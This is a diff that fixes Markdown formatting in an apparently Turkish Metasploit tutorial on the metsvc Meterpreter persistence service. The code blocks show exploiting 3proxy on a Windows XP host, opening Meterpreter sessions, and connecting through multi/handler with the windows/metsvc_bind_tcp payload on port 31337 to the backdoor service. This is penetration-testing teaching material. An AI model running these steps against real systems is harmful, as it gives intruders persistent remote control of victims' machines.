@@ -34,12 +34,12 @@ metsvc hakkında bilmeniz gereken önemli bir noktayı vurgulayalım. **Bu servi
 
 
 ```bash
-msf exploit**(**3proxy**)** > exploit
+msf exploit(3proxy) > exploit
 
 > Started reverse handler
 > Trying target Windows XP SP2 - English...
-> Sending stage **(**719360 bytes**)**
-> Meterpreter session 1 opened **(**192.168.1.101:4444 -> 192.168.1.104:1983**)**
+> Sending stage (719360 bytes)
+> Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.104:1983)
 ```
 
 
@@ -96,7 +96,7 @@ OPTIONS:
 
     -A        Automatically start a matching multi/handler to connect to the service
     -h        This help menu
-    -r        Uninstall an existing Meterpreter service **(**files must be deleted manually**)**
+    -r        Uninstall an existing Meterpreter service (files must be deleted manually)
 
 meterpreter >
 ```
@@ -132,13 +132,13 @@ Hedef sistemde dinleme durumundaki `metsvc` ile haberleşmek için `windows/mets
 
 ```bash
 msf > use exploit/multi/handler
-msf exploit**(**handler**)** > set PAYLOAD windows/metsvc_bind_tcp
-PAYLOAD **=>** windows/metsvc_bind_tcp
-msf exploit**(**handler**)** > set LPORT 31337
-LPORT **=>** 31337
-msf exploit**(**handler**)** > set RHOST 192.168.1.104
-RHOST **=>** 192.168.1.104
-msf exploit**(**handler**)** > show options
+msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
+PAYLOAD => windows/metsvc_bind_tcp
+msf exploit(handler) > set LPORT 31337
+LPORT => 31337
+msf exploit(handler) > set RHOST 192.168.1.104
+RHOST => 192.168.1.104
+msf exploit(handler) > show options
 
 Module options:
 
@@ -146,7 +146,7 @@ Module options:
    ----  ---------------  --------  -----------
 
 
-Payload options **(**windows/metsvc_bind_tcp**)**:
+Payload options (windows/metsvc_bind_tcp):
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
@@ -162,11 +162,11 @@ Exploit target:
    0   Wildcard Target
 
 
-msf exploit**(**handler**)** > exploit
+msf exploit(handler) > exploit
 
 > Starting the payload handler...
 > Started bind handler
-> Meterpreter session 2 opened **(**192.168.1.101:60840 -> 192.168.1.104:31337**)**
+> Meterpreter session 2 opened (192.168.1.101:60840 -> 192.168.1.104:31337)
 ```
 
 
